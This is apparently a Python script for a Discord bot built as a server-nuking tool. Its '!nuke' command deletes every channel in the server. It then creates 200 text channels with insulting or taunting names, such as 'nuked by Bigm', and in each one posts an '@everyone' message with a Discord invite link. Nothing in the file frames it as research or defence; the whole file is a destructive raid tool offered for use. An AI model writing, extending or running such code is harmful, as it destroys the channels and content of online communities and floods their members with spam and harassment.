import discord
from discord.ext import commands
import random

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

print("bot is alive")


channel_names = ["ur a bitchh", "get rekt", "nuked by Bigm", "chaos incoming", "owo explosion", "server wipe"]

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='nuke')
async def create_and_delete_channels(ctx):

    for channel in ctx.guild.channels:
        await channel.delete()


    for i in range(1, 201):
        channel_name = random.choice(channel_names)
        new_channel = await ctx.guild.create_text_channel(f'{channel_name}-{i}')
        await new_channel.send('@everyone nuked by Bigm https://discord.gg/AsNaKGtUM9')

    await ctx.send('deleted all')


bot.run('your bot token')